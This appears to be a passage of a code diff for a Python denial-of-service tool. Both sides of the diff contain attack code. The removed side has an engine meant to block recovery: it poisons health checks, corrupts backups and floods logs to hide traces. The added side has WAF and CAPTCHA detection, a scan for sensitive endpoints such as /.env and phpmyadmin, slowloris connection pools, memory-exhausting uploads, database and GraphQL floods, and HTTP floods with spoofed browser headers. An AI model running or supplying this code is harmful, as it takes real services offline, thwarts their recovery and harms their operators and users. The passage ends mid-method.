-        console.print(f"\n[bold red]☠️  TOTAL ATTACK SURFACE: {total_attack_points} VULNERABLE POINTS[/]")
-        console.print("[yellow]Ready for permanent destruction![/]")
-
-# ==================== PERMANENT DOWNTIME ENGINE ====================
-class PermanentDowntimeEngine:
-    """Engine to ensure target NEVER recovers"""
-    
-    def __init__(self, target_info):
-        self.target = target_info
-        self.downtime_start = None
-        self.recovery_prevented = False
-        self.active_attackers = []
-        
-        # Attack modules
-        self.health_killer = None
-        self.backup_destroyer = None
-        self.log_corruptor = None
-        self.resource_exhauster = None
-        
-    async def activate_permanent_downtime(self):
-        """Activate ALL permanent downtime mechanisms"""
-        console.print("\n[bold red]☠️  ACTIVATING PERMANENT DOWNTIME ENGINE[/]")
-        console.print("[yellow]Target will NEVER recover from this attack![/]")
-        
-        self.downtime_start = time.time()
-        AttackState.stats['permanent_downtime'] = True
-        
-        # Start all attack modules
-        attack_tasks = [
-            self._start_health_check_killer(),
-            self._start_backup_destroyer(),
-            self._start_log_corruptor(),
-            self._start_resource_exhauster(),
-            self._start_permanent_pressure()
+        waf_indicators = [
+            '403 forbidden',
+            'access denied',
+            'your request has been blocked',
+            'security violation',
+            'waf',
+            'imperva',
+            'akamai',
+            'sucuri',
+            'incapsula',
+            'barracuda',
+            'fortinet'
         ]
         
-        # Run all attacks concurrently
-        try:
-            await asyncio.gather(*attack_tasks)
-        except KeyboardInterrupt:
-            console.print("\n[yellow]⚠️  Permanent downtime stopped[/]")
-        except Exception as e:
-            console.print(f"[red]✗ Permanent downtime error: {e}[/]")
-    
-    async def _start_health_check_killer(self):
-        """Kill all health checks to prevent auto-scaling"""
-        console.print("[red]💀 ACTIVATING HEALTH CHECK KILLER[/]")
+        if not self.protection_detected:
+            for indicator in waf_indicators:
+                if indicator in content:
+                    self.protection_detected = True
+                    self.protection_type = 'waf'
+                    AttackState.stats['waf_detected'] = True
+                    break
         
-        health_endpoints = self.target.infrastructure['health_endpoints']
-        if not health_endpoints:
-            console.print("[yellow]⚠️  No health endpoints found[/]")
-            return
-        
-        console.print(f"[cyan]Targeting {len(health_endpoints)} health endpoints[/]")
-        
-        while AttackState.attacking:
-            try:
-                for endpoint in health_endpoints:
-                    await self._poison_health_endpoint(endpoint)
-                    AttackState.stats['health_checks_killed'] += 1
-                    
-                    # Show progress every 10 kills
-                    if AttackState.stats['health_checks_killed'] % 10 == 0:
-                        console.print(f"[red]☠️  Health checks killed: {AttackState.stats['health_checks_killed']}[/]")
-                
-                await asyncio.sleep(random.uniform(2, 5))
-                
-            except Exception as e:
-                await asyncio.sleep(1)
-    
-    async def _poison_health_endpoint(self, endpoint):
-        """Make health endpoint return failure"""
-        try:
-            # Create raw TCP connection
-            reader, writer = await asyncio.open_connection(
-                self.target.host, self.target.port,
-                ssl=self.target.ssl_enabled
-            )
-            
-            # Send fake failure response
-            failure_responses = [
-                'HTTP/1.1 500 Internal Server Error\r\n\r\n',
-                'HTTP/1.1 503 Service Unavailable\r\n\r\n',
-                'DOWN\r\n',
-                'ERROR\r\n',
-                '{"status": "down", "error": "system_failure"}\r\n',
-                '{"healthy": false, "message": "service_unavailable"}\r\n'
-            ]
-            
-            response = random.choice(failure_responses)
-            writer.write(response.encode())
-            await writer.drain()
-            
-            # Keep connection open to waste resources
-            await asyncio.sleep(random.uniform(5, 15))
-            
-            writer.close()
-            await writer.wait_closed()
-            
-        except:
-            pass
-    
-    async def _start_backup_destroyer(self):
-        """Destroy backup endpoints to prevent recovery"""
-        if not Config.DESTROY_BACKUPS:
-            return
-            
-        console.print("[red]💾 ACTIVATING BACKUP DESTROYER[/]")
-        
-        backup_endpoints = self.target.infrastructure['backup_endpoints']
-        if not backup_endpoints:
-            console.print("[yellow]⚠️  No backup endpoints found[/]")
-            return
-        
-        console.print(f"[cyan]Targeting {len(backup_endpoints)} backup endpoints[/]")
-        
-        while AttackState.attacking:
-            try:
-                for endpoint in backup_endpoints:
-                    await self._corrupt_backup(endpoint)
-                    AttackState.stats['backups_destroyed'] += 1
-                    
-                    if AttackState.stats['backups_destroyed'] % 5 == 0:
-                        console.print(f"[red]💀 Backups destroyed: {AttackState.stats['backups_destroyed']}[/]")
-                
-                await asyncio.sleep(random.uniform(10, 20))
-                
-            except Exception as e:
-                await asyncio.sleep(5)
-    
-    async def _corrupt_backup(self, endpoint):
-        """Corrupt backup files"""
-        try:
-            # Send malformed requests to backup endpoints
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=10)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{self.target.protocol}://{self.target.host}:{self.target.port}{endpoint}"
-                
-                # Send corrupted data
-                corrupted_data = b'\x00' * 1024 * 1024  # 1MB of null bytes
-                
-                async with session.post(url, data=corrupted_data, ssl=False) as response:
-                    pass
-                    
-        except:
-            pass
-    
-    async def _start_log_corruptor(self):
-        """Corrupt log files to hide attack traces"""
-        if not Config.CORRUPT_LOGS:
-            return
-            
-        console.print("[red]📝 ACTIVATING LOG CORRUPTOR[/]")
-        
-        log_endpoints = [
-            '/var/log', '/logs', '/log', '/tmp/logs',
-            '/application/logs', '/app/logs', '/system/logs',
-            '/error_log', '/access_log', '/debug.log',
-            '/error.log', '/access.log', '/server.log'
+        captcha_indicators = [
+            'captcha',
+            'recaptcha',
+            'hcaptcha',
+            'verify you are human',
+            'are you a human',
+            'robot check'
         ]
         
-        while AttackState.attacking:
-            try:
-                for endpoint in log_endpoints:
-                    await self._flood_logs(endpoint)
-                    AttackState.stats['logs_corrupted'] += 1
-                    
-                    if AttackState.stats['logs_corrupted'] % 10 == 0:
-                        console.print(f"[red]📝 Logs corrupted: {AttackState.stats['logs_corrupted']}[/]")
-                
-                await asyncio.sleep(random.uniform(5, 15))
-                
-            except Exception as e:
-                await asyncio.sleep(3)
+        if not self.protection_detected:
+            for indicator in captcha_indicators:
+                if indicator in content:
+                    self.protection_detected = True
+                    self.protection_type = 'captcha'
+                    break
     
-    async def _flood_logs(self, endpoint):
-        """Flood logs with garbage data"""
-        try:
-            # Send massive amounts of garbage requests
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=15)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{self.target.protocol}://{self.target.host}:{self.target.port}{endpoint}"
-                
-                # Generate garbage data
-                garbage_headers = {
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'X-Forwarded-For': f'192.168.{random.randint(1,255)}.{random.randint(1,255)}',
-                    'Referer': 'http://malicious-site.com/exploit',
-                    'Cookie': 'session_id=' + 'A' * 1000
-                }
-                
-                # Send multiple garbage requests
-                for _ in range(random.randint(10, 50)):
-                    try:
-                        async with session.get(url, headers=garbage_headers, ssl=False) as response:
-                            pass
-                    except:
-                        continue
-                        
-        except:
-            pass
-    
-    async def _start_resource_exhauster(self):
-        """Exhaust all server resources"""
-        if not Config.EXHAUST_RESOURCES:
-            return
-            
-        console.print("[red]⚡ ACTIVATING RESOURCE EXHAUSTER[/]")
+    def _find_vulnerabilities(self):
+        import requests
+        vuln_endpoints = [
+            '/xmlrpc.php',
+            '/wp-json/wp/v2/users',
+            '/.env',
+            '/phpinfo.php',
+            '/server-status',
+            '/admin/config.php',
+            '/debug',
+            '/test',
+            '/backup',
+            '/database.sql',
+            '/wp-admin/install.php',
+            '/administrator/index.php',
+            '/cgi-bin/test.cgi',
+            '/api/v1/users',
+            '/graphql',
+            '/phpmyadmin',
+            '/adminer.php',
+            '/mysql/admin',
+            '/dbadmin',
+            '/pma'
+        ]
         
-        while AttackState.attacking:
+        for endpoint in vuln_endpoints:
             try:
-                # Multiple resource exhaustion techniques
-                await self._exhaust_memory()
-                await self._exhaust_cpu()
-                await self._exhaust_disk()
-                await self._exhaust_network()
-                
-                AttackState.stats['resources_exhausted'] += 1
-                
-                if AttackState.stats['resources_exhausted'] % 5 == 0:
-                    console.print(f"[red]⚡ Resources exhausted cycles: {AttackState.stats['resources_exhausted']}[/]")
-                
-                await asyncio.sleep(random.uniform(3, 8))
-                
-            except Exception as e:
-                await asyncio.sleep(2)
-    
-    async def _exhaust_memory(self):
-        """Exhaust server memory"""
-        try:
-            # Send requests with large payloads
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=20)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{self.target.protocol}://{self.target.host}:{self.target.port}/"
-                
-                # Large JSON payload
-                large_payload = {'data': 'A' * 1024 * 1024}  # 1MB
-                
-                for _ in range(random.randint(5, 20)):
-                    try:
-                        async with session.post(url, json=large_payload, ssl=False) as response:
-                            pass
-                    except:
-                        continue
-                        
-        except:
-            pass
-    
-    async def _exhaust_cpu(self):
-        """Exhaust server CPU"""
-        try:
-            # Complex queries and computations
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=30)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{self.target.protocol}://{self.target.host}:{self.target.port}/"
-                
-                # Send CPU-intensive requests
-                cpu_intensive_params = {
-                    'search': 'A' * 1000,
-                    'filter': 'complex' * 100,
-                    'sort': 'multiple,criteria,with,long,strings',
-                    'page': '1',
-                    'limit': '1000'
-                }
-                
-                for _ in range(random.randint(10, 30)):
-                    try:
-                        async with session.get(url, params=cpu_intensive_params, ssl=False) as response:
-                            pass
-                    except:
-                        continue
-                        
-        except:
-            pass
-    
-    async def _exhaust_disk(self):
-        """Exhaust server disk space"""
-        try:
-            # Upload large files
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=25)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                upload_url = f"{self.target.protocol}://{self.target.host}:{self.target.port}/upload"
-                
-                # Generate large file data
-                file_data = b'0' * 1024 * 1024 * 5  # 5MB
-                
-                for _ in range(random.randint(3, 10)):
-                    try:
-                        data = aiohttp.FormData()
-                        data.add_field('file', file_data, filename='garbage.bin', content_type='application/octet-stream')
-                        
-                        async with session.post(upload_url, data=data, ssl=False) as response:
-                            pass
-                    except:
-                        continue
-                        
-        except:
-            pass
-    
-    async def _exhaust_network(self):
-        """Exhaust network bandwidth"""
-        try:
-            # Open many connections and keep them alive
-            connections = []
-            
-            for _ in range(random.randint(50, 200)):
-                try:
-                    reader, writer = await asyncio.open_connection(
-                        self.target.host, self.target.port,
-                        ssl=self.target.ssl_enabled
-                    )
-                    
-                    # Send partial request and keep connection open
-                    writer.write(b"GET / HTTP/1.1\r\n")
-                    writer.write(f"Host: {self.target.host}\r\n".encode())
-                    await writer.drain()
-                    
-                    connections.append((reader, writer))
-                    
-                except:
-                    continue
-            
-            # Keep connections open for a while
-            await asyncio.sleep(random.uniform(30, 60))
-            
-            # Close connections
-            for reader, writer in connections:
-                try:
-                    writer.close()
-                    await writer.wait_closed()
-                except:
-                    pass
-                    
-        except:
-            pass
-    
-    async def _start_permanent_pressure(self):
-        """Apply permanent pressure to prevent any recovery"""
-        console.print("[red]🔨 ACTIVATING PERMANENT PRESSURE SYSTEM[/]")
-        
-        pressure_workers = []
-        
-        # Start multiple pressure workers
-        for i in range(10):
-            worker = asyncio.create_task(self._pressure_worker(i))
-            pressure_workers.append(worker)
-        
-        # Monitor and maintain pressure
-        while AttackState.attacking:
-            try:
-                # Check if target shows any signs of recovery
-                is_recovering = await self._check_recovery()
-                
-                if is_recovering:
-                    console.print(f"[red]🔄 Target attempting recovery! Increasing pressure...[/]")
-                    await self._increase_pressure()
-                
-                # Update downtime duration
-                if self.downtime_start:
-                    downtime = int(time.time() - self.downtime_start)
-                    AttackState.stats['downtime_duration'] = downtime
-                    
-                    # Show status every minute
-                    if downtime % 60 == 0 and downtime > 0:
-                        minutes = downtime // 60
-                        console.print(f"[red]⏱️  PERMANENT DOWNTIME: {minutes} minutes and counting...[/]")
-                
-                await asyncio.sleep(5)
-                
-            except Exception as e:
-                await asyncio.sleep(10)
-    
-    async def _pressure_worker(self, worker_id):
-        """Individual pressure worker"""
-        while AttackState.attacking:
-            try:
-                # Mix of attack techniques
-                attack_type = random.choice(['http_flood', 'slowloris', 'resource_drain'])
-                
-                if attack_type == 'http_flood':
-                    await self._http_flood_attack()
-                elif attack_type == 'slowloris':
-                    await self._slowloris_attack()
-                elif attack_type == 'resource_drain':
-                    await self._resource_drain_attack()
-                
-                # Random delay
-                await asyncio.sleep(random.uniform(0.1, 1))
-                
-            except Exception as e:
-                await asyncio.sleep(1)
-    
-    async def _http_flood_attack(self):
-        """HTTP flood attack"""
-        try:
-            connector = aiohttp.TCPConnector(ssl=False, limit=0)
-            timeout = aiohttp.ClientTimeout(total=10)
-            
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                url = f"{self.target.protocol}://{self.target.host}:{self.target.port}/"
-                
-                # Randomize request parameters
-                paths = ['/', '/index.html', '/api', '/admin', '/login', '/assets']
-                path = random.choice(paths)
-                url += path.lstrip('/')
-                
-                # Random headers
+                test_url = f"{self.url.rstrip('/')}{endpoint}"
                 browser = random.choice(BROWSER_SIGNATURES)
                 headers = browser['headers'].copy()
                 headers['User-Agent'] = browser['user_agent']
-                
-                # Spoof IP if enabled
-                if Config.SPOOF_IPS:
-                    headers['X-Forwarded-For'] = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
-                
-                async with session.get(url, headers=headers, ssl=False) as response:
-                    with AttackState.lock:
-                        AttackState.stats['total_requests'] += 1
-                        AttackState.stats['bytes_received'] += len(await response.read())
-                        
-                        if response.status < 400:
-                            AttackState.stats['successful'] += 1
-                        else:
-                            AttackState.stats['blocked'] += 1
-                            
-        except Exception as e:
-            with AttackState.lock:
-                AttackState.stats['errors'] += 1
+                resp = requests.get(test_url, headers=headers, timeout=3, verify=False)
+                if resp.status_code in [200, 403, 500]:
+                    self.vulnerabilities.append(endpoint)
+            except:
+                continue
     
-    async def _slowloris_attack(self):
-        """Slowloris attack - keep connections open"""
+    def _estimate_server_load(self, response):
         try:
-            reader, writer = await asyncio.open_connection(
-                self.target.host, self.target.port,
-                ssl=self.target.ssl_enabled
-            )
+            import requests
+            import time as t
             
-            # Send partial headers slowly
+            start_time = t.time()
+            test_response = requests.get(self.url, timeout=5, verify=False)
+            end_time = t.time()
+            
+            response_time = (end_time - start_time) * 1000
+            
+            if response_time < 100:
+                self.server_load = "low"
+            elif response_time < 500:
+                self.server_load = "medium"
+            elif response_time < 1000:
+                self.server_load = "high"
+            else:
+                self.server_load = "very high"
+                
+        except:
+            self.server_load = "unknown"
+
+# ==================== PERSISTENT CONNECTION POOL ====================
+class PersistentConnectionPool:
+    
+    def __init__(self, target: TargetInfo, pool_size: int = 100):
+        self.target = target
+        self.pool_size = pool_size
+        self.connections: List[socket.socket] = []
+        self.active_connections = 0
+        self.lock = threading.Lock()
+        self.running = False
+        self.keep_alive_thread = None
+        
+    def create_connections(self):
+        console.print(f"[cyan]🔗 Creating {self.pool_size} persistent connections...[/]")
+        
+        for i in range(self.pool_size):
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(30)
+                
+                sock.connect((self.target.ip, self.target.port))
+                
+                request = f"GET / HTTP/1.1\r\n"
+                request += f"Host: {self.target.host}\r\n"
+                request += f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n"
+                request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                request += f"Accept-Language: en-US,en;q=0.9\r\n"
+                
+                sock.send(request.encode())
+                
+                with self.lock:
+                    self.connections.append(sock)
+                    self.active_connections += 1
+                    AttackState.stats['persistent_connections'] += 1
+                    
+                if i % 50 == 0:
+                    console.print(f"[green]✓ Created {i+1}/{self.pool_size} connections[/]")
+                    
+            except Exception as e:
+                console.print(f"[yellow]⚠️  Failed to create connection {i}: {e}[/]")
+                continue
+        
+        console.print(f"[green]✅ Created {self.active_connections} persistent connections[/]")
+        return self.active_connections
+    
+    def send_keep_alive(self):
+        while self.running and AttackState.attacking:
+            try:
+                with self.lock:
+                    active_conns = self.connections.copy()
+                
+                for sock in active_conns:
+                    try:
+                        sock.send(b"X-a: b\r\n")
+                        time.sleep(0.01)
+                    except:
+                        with self.lock:
+                            if sock in self.connections:
+                                self.connections.remove(sock)
+                                self.active_connections -= 1
+                                AttackState.stats['persistent_connections'] -= 1
+                        try:
+                            sock.close()
+                        except:
+                            pass
+                
+                if self.active_connections < self.pool_size * 0.8:
+                    self._replenish_connections()
+                
+                AttackState.stats['connection_pool_size'] = self.active_connections
+                
+                time.sleep(random.uniform(15, 30))
+                
+            except Exception as e:
+                console.print(f"[red]✗ Keep-alive error: {e}[/]")
+                time.sleep(5)
+    
+    def _replenish_connections(self):
+        needed = self.pool_size - self.active_connections
+        if needed > 0:
+            console.print(f"[yellow]🔄 Replenishing {needed} broken connections...[/]")
+            for i in range(needed):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(30)
+                    sock.connect((self.target.ip, self.target.port))
+                    
+                    request = f"GET / HTTP/1.1\r\n"
+                    request += f"Host: {self.target.host}\r\n"
+                    request += f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n"
+                    request += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                    
+                    sock.send(request.encode())
+                    
+                    with self.lock:
+                        self.connections.append(sock)
+                        self.active_connections += 1
+                        AttackState.stats['persistent_connections'] += 1
+                        
+                except:
+                    continue
+    
+    def start(self):
+        self.running = True
+        self.keep_alive_thread = threading.Thread(target=self.send_keep_alive, daemon=True)
+        self.keep_alive_thread.start()
+        console.print("[green]✅ Persistent connection pool started[/]")
+    
+    def stop(self):
+        self.running = False
+        
+        if self.keep_alive_thread:
+            self.keep_alive_thread.join(timeout=5)
+        
+        with self.lock:
+            for sock in self.connections:
+                try:
+                    sock.close()
+                except:
+                    pass
+            self.connections.clear()
+            self.active_connections = 0
+            AttackState.stats['persistent_connections'] = 0
+        
+        console.print("[yellow]🛑 Persistent connection pool stopped[/]")
+
+# ==================== ADVANCED ATTACK VECTORS ====================
+class AdvancedAttackVectors:
+    
+    @staticmethod
+    async def slowloris_attack(target: TargetInfo, worker_id: int):
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(Config.CONNECTION_TIMEOUT)
+            
+            sock.connect((target.ip, target.port))
+            
             request_lines = [
-                f"GET / HTTP/1.1\r\n",
-                f"Host: {self.target.host}\r\n",
+                f"GET /{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))} HTTP/1.1\r\n",
+                f"Host: {target.host}\r\n",
                 f"User-Agent: {random.choice(BROWSER_SIGNATURES)['user_agent']}\r\n",
                 f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                 f"Accept-Language: en-US,en;q=0.9\r\n",
@@ -1135,330 +641,1068 @@ class PermanentDowntimeEngine:
                 f"Keep-Alive: timeout=900\r\n"
             ]
             
-            # Send headers slowly
-            for line in request_lines:
-                writer.write(line.encode())
-                await writer.drain()
-                await asyncio.sleep(random.uniform(10, 30))
+            for i, line in enumerate(request_lines):
+                sock.send(line.encode())
+                
+                if i < len(request_lines) - 1:
+                    delay = random.uniform(5, 15)
+                    await asyncio.sleep(delay)
             
-            # Keep connection open
-            await asyncio.sleep(random.uniform(60, 180))
+            start_time = time.time()
+            while (time.time() - start_time) < 600 and AttackState.attacking:
+                try:
+                    random_headers = [
+                        f"X-{random.choice(['Custom', 'Request', 'Header', 'Token'])}: {random.randint(1000, 9999)}\r\n",
+                        f"Cache-Control: {random.choice(['no-cache', 'max-age=0', 'no-store'])}\r\n",
+                        f"Pragma: {random.choice(['no-cache', ''])}\r\n"
+                    ]
+                    
+                    for header in random_headers:
+                        sock.send(header.encode())
+                        await asyncio.sleep(random.uniform(10, 30))
+                        
+                except Exception as e:
+                    break
             
-            writer.close()
-            await writer.wait_closed()
+            try:
+                sock.close()
+            except:
+                pass
             
-        except:
-            pass
+            with AttackState.lock:
+                AttackState.stats['slowloris_connections'] += 1
+                AttackState.stats['successful'] += 1
+            
+            return 'success'
+            
+        except Exception as e:
+            with AttackState.lock:
+                AttackState.stats['errors'] += 1
+            return 'error'
     
-    async def _resource_drain_attack(self):
-        """Drain server resources"""
+    @staticmethod
+    async def memory_exhaustion_attack(target: TargetInfo, session: aiohttp.ClientSession):
         try:
-            # Open multiple connections without closing
-            connections = []
+            payload_size = random.randint(
+                Config.MEMORY_EXHAUSTION_SIZE // 2,
+                Config.MEMORY_EXHAUSTION_SIZE
+            )
             
-            for _ in range(random.randint(20, 50)):
+            large_payload = os.urandom(payload_size)
+            
+            boundary = "----WebKitFormBoundary" + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
+            
+            body_start = f"--{boundary}\r\n"
+            body_start += 'Content-Disposition: form-data; name="file"; filename="large_file.bin"\r\n'
+            body_start += 'Content-Type: application/octet-stream\r\n\r\n'
+            
+            body_end = f"\r\n--{boundary}--\r\n"
+            
+            full_body = body_start.encode() + large_payload + body_end.encode()
+            
+            headers = {
+                'User-Agent': random.choice(BROWSER_SIGNATURES)['user_agent'],
+                'Content-Type': f'multipart/form-data; boundary={boundary}',
+                'Content-Length': str(len(full_body)),
+                'Connection': 'keep-alive',
+                'Accept': '*/*',
+                'Accept-Encoding': 'gzip, deflate, br'
+            }
+            
+            upload_urls = [
+                f"{target.protocol}://{target.host}:{target.port}/upload",
+                f"{target.protocol}://{target.host}:{target.port}/api/upload",
+                f"{target.protocol}://{target.host}:{target.port}/admin/upload",
+                f"{target.protocol}://{target.host}:{target.port}/wp-admin/async-upload.php"
+            ]
+            
+            url = random.choice(upload_urls)
+            
+            async with session.post(
+                url,
+                data=full_body,
+                headers=headers,
+                ssl=ssl_context,
+                timeout=aiohttp.ClientTimeout(total=60)
+            ) as response:
+                
                 try:
-                    reader, writer = await asyncio.open_connection(
-                        self.target.host, self.target.port,
-                        ssl=self.target.ssl_enabled
-                    )
-                    
-                    # Send request but don't wait for response
-                    writer.write(b"POST /upload HTTP/1.1\r\n")
-                    writer.write(f"Host: {self.target.host}\r\n".encode())
-                    writer.write(b"Content-Type: multipart/form-data; boundary=boundary\r\n")
-                    writer.write(b"Content-Length: 10485760\r\n\r\n")  # 10MB
-                    
-                    connections.append((reader, writer))
-                    
-                except:
-                    continue
-            
-            # Keep connections open
-            await asyncio.sleep(random.uniform(45, 90))
-            
-            # Close connections
-            for reader, writer in connections:
-                try:
-                    writer.close()
-                    await writer.wait_closed()
+                    await response.read()
                 except:
                     pass
-                    
-        except:
-            pass
+                
+                with AttackState.lock:
+                    AttackState.stats['memory_exhaustion_attempts'] += 1
+                    AttackState.stats['bytes_sent'] += len(full_body)
+                    AttackState.stats['successful'] += 1
+                
+                return 'success'
+                
+        except asyncio.TimeoutError:
+            with AttackState.lock:
+                AttackState.stats['memory_exhaustion_attempts'] += 1
+                AttackState.stats['successful'] += 1
+            return 'success'
+        except Exception as e:
+            with AttackState.lock:
+                AttackState.stats['errors'] += 1
+            return 'error'
     
-    async def _check_recovery(self):
-        """Check if target is attempting recovery"""
+    @staticmethod
+    async def database_flood_attack(target: TargetInfo, session: aiohttp.ClientSession):
         try:
-            # Quick check on multiple endpoints
-            check_endpoints = ['/', '/health', '/status', '/api']
+            db_endpoints = [
+                '/search?q=' + 'a' * random.randint(500, 2000),
+                '/api/products?limit=' + str(random.randint(100, 1000)) + '&offset=' + str(random.randint(0, 10000)),
+                '/wp-json/wp/v2/posts?per_page=' + str(random.randint(50, 200)),
+                '/api/users?fields=' + ','.join(['*'] * random.randint(20, 100)),
+                '/api/orders?status=' + random.choice(['pending', 'processing', 'completed', 'cancelled'])
+            ]
             
-            connector = aiohttp.TCPConnector(ssl=False)
-            timeout = aiohttp.ClientTimeout(total=5)
+            endpoint = random.choice(db_endpoints)
+            url = f"{target.protocol}://{target.host}:{target.port}{endpoint}"
             
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-                for endpoint in check_endpoints:
-                    try:
-                        url = f"{self.target.protocol}://{self.target.host}:{self.target.port}{endpoint}"
-                        async with session.get(url, ssl=False) as response:
-                            if response.status < 500:
-                                return True
-                    except:
-                        continue
+            headers = random.choice(BROWSER_SIGNATURES)['headers'].copy()
+            headers['User-Agent'] = random.choice(BROWSER_SIGNATURES)['user_agent']
             
-            return False
+            if 'graphql' in endpoint:
+                headers['Content-Type'] = 'application/json'
+                query = {
+                    "query": """
+                    query {
+                      users {
+                        id
+                        name
+                        email
+                        posts {
+                          id
+                          title
+                          comments {
+                            id
+                            content
+                            author {
+                              id
+                              name
+                            }
+                          }
+                        }
+                        friends {
+                          id
+                          name
+                          posts {
+                            id
+                            title
+                          }
+                        }
+                      }
+                    }
+                    """
+                }
+                
+                async with session.post(url, json=query, headers=headers,
+                                      ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=30)) as response:
+                    await response.read()
+            else:
+                async with session.get(url, headers=headers,
+                                     ssl=ssl_context,
+                                     timeout=aiohttp.ClientTimeout(total=20)) as response:
+                    await response.read()
             
-        except:
-            return False
+            with AttackState.lock:
+                AttackState.stats['database_floods'] += 1
+                AttackState.stats['successful'] += 1
+            
+            return 'success'
+            
+        except asyncio.TimeoutError:
+            with AttackState.lock:
+                AttackState.stats['database_floods'] += 1
+                AttackState.stats['successful'] += 1
+            return 'success'
+        except Exception as e:
+            with AttackState.lock:
+                AttackState.stats['errors'] += 1
+            return 'error'
     
-    async def _increase_pressure(self):
-        """Increase attack pressure"""
-        console.print("[red]💥 INCREASING ATTACK PRESSURE![/]")
-        
-        # Double the attack intensity
-        Config.MAX_RPS = min(Config.MAX_RPS * 2, 10000)
-        Config.MAX_THREADS = min(Config.MAX_THREADS * 2, 5000)
-        
-        # Start additional workers
-        additional_workers = random.randint(5, 15)
-        for i in range(additional_workers):
-            asyncio.create_task(self._pressure_worker(100 + i))
-        
-        console.print(f"[red]⚡ Pressure increased! Now using {Config.MAX_THREADS} threads at {Config.MAX_RPS} RPS[/]")
+    @staticmethod
+    async def http_flood_attack(target: TargetInfo, session: aiohttp.ClientSession):
+        try:
+            paths = [
+                '/', '/index.html', '/home', '/main', '/default.aspx',
+                '/about', '/contact', '/products', '/services', '/blog',
+                '/news', '/articles', '/faq', '/help', '/support',
+                '/login', '/register', '/account', '/profile', '/dashboard'
+            ]
+            
+            path = random.choice(paths)
+            
+            params = []
+            if random.random() > 0.4:
+                params.append(f"utm_source={random.choice(['google', 'facebook', 'twitter', 'direct'])}")
+            if random.random() > 0.6:
+                params.append(f"utm_medium={random.choice(['organic', 'cpc', 'social', 'email'])}")
+            if random.random() > 0.7:
+                params.append(f"ref={random.choice(['homepage', 'internal', 'external'])}")
+            if random.random() > 0.5:
+                params.append(f"_={random.randint(1000000000, 9999999999)}")
+            
+            param_str = "?" + "&".join(params) if params else ""
+            
+            if target.port in [80, 443]:
+                url = f"{target.protocol}://{target.host}{path}{param_str}"
+            else:
+                url = f"{target.protocol}://{target.host}:{target.port}{path}{param_str}"
+            
+            browser = random.choice(BROWSER_SIGNATURES)
+            headers = browser['headers'].copy()
+            headers['User-Agent'] = browser['user_agent']
+            
+            if random.random() > 0.3:
+                headers['Referer'] = random.choice(REFERERS)
+            
+            if random.random() > 0.5:
+                headers['Cookie'] = f"session_id={random.randint(10000, 99999)}; visited=true"
+            
+            methods = ['GET', 'HEAD', 'POST']
+            method_weights = [0.7, 0.1, 0.2]
+            method = random.choices(methods, weights=method_weights)[0]
+            
+            if method == 'GET':
+                async with session.get(url, headers=headers, ssl=ssl_context,
+                                     timeout=aiohttp.ClientTimeout(total=15)) as response:
+                    await response.read()
+            elif method == 'POST':
+                post_data = {
+                    'search': random.choice(['', 'test', 'query', 'product']),
+                    'email': f"user{random.randint(1, 1000)}@example.com",
+                    'name': random.choice(['John', 'Jane', 'Mike', 'Sarah']),
+                    'message': random.choice(['', 'Hello', 'Test message', 'Inquiry'])
+                }
+                async with session.post(url, data=post_data, headers=headers, ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=15)) as response:
+                    await response.read()
+            else:
+                async with session.head(url, headers=headers, ssl=ssl_context,
+                                      timeout=aiohttp.ClientTimeout(total=10)) as response:
+                    await response.read()
+            
+            with AttackState.lock:
+                AttackState.stats['total_requests'] += 1
+                AttackState.stats['successful'] += 1
+            
+            return 'success'
+            
+        except asyncio.TimeoutError:
+            with AttackState.lock:
+                AttackState.stats['total_requests'] += 1
+                AttackState.stats['errors'] += 1
+            return 'timeout'
+        except Exception as e:
+            with AttackState.lock:
+                AttackState.stats['total_requests'] += 1
+                AttackState.stats['errors'] += 1
+            return 'error'
     
-    def get_attack_report(self):
-        """Generate attack report"""
-        if not self.downtime_start:
-            return None
-        
-        downtime = int(time.time() - self.downtime_start)
-        
-        report = {
-            'target': f"{self.target.protocol}://{self.target.host}:{self.target.port}",
-            'downtime_duration': downtime,
-            'downtime_minutes': downtime // 60,
-            'health_checks_killed': AttackState.stats['health_checks_killed'],
-            'backups_destroyed': AttackState.stats['backups_destroyed'],
-            'logs_corrupted': AttackState.stats['logs_corrupted'],
-            'resources_exhausted': AttackState.stats['resources_exhausted'],
-            'total_requests': AttackState.stats['total_requests'],
-            'recovery_prevented': AttackState.stats['recovery_prevented'],
-            'permanent_downtime': AttackState.stats['permanent_downtime']
-        }
-        
-        return report
+    @staticmethod
